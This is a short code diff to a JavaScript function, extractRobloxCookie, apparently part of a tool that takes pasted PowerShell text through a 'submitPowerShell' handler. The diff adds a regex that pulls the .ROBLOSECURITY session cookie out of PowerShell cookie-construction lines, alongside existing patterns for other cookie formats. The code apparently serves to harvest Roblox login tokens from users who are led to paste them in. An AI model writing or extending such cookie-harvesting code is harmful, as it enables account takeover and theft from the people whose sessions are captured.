@@ -333,6 +333,8 @@ async function submitPowerShell() {
 function extractRobloxCookie(text) {
     // Look for various Roblox authentication patterns
     const patterns = [
+        // PowerShell New-Object System.Net.Cookie format with .ROBLOSECURITY
+        /New-Object\s+System\.Net\.Cookie\s*\(\s*"\.ROBLOSECURITY"\s*,\s*"([^"]+)"/i,
         // Standard .ROBLOSECURITY cookie format
         /\.ROBLOSECURITY=([^;"\s\n]+)/i,
         // Warning format with the actual cookie
